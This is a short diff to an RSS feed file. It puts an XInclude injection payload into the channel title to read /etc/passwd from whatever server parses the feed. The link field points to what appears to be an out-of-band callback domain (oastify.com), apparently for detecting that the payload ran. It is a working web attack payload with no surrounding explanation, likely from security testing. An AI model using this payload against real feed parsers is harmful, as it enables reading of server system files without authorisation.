@@ -1,7 +1,8 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <rss version="2.0">
   <channel>
-    <title>asdf</title>
+    <title><foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo></title>
     <link>https://caqv7dhje93k04deqspf2803lurlfi37.oastify.com</link>
     <description><![CDATA[
         <p>This is a &#x3c;i&#x3e;asdf&#x3c;/i&#x3e; <strong>rich HTML description</strong> with an <a href="http://example.com">external link</a>.</p>
